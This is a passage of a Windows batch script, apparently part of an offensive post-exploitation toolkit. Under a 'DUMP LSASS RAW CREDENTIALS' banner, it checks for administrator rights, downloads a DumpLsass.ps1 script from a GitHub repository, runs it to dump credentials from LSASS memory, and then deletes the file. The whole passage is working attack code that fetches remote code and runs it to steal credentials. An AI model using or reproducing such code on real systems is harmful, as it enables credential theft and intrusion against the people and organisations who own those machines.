...
:: Dump LSASS if admin
echo DUMP LSASS RAW CREDENTIALS (admin)
echo ----------------------------------
powershell -C "$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match 'S-1-5-32-544');If($bool){iwr -Uri 'https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DumpLsass.ps1' -OutFile $Env:TMP\DumpLsass.ps1|Unblock-File;powershell -File $Env:TMP\DumpLsass.ps1 -action all}Else{Write-Host '[LSASS] ERROR Administrator privileges required to dump lsass ..' -ForeGroundColor Red -BackGroundColor Black}"
del /f %tmp%\DumpLsass.ps1
echo.
echo.
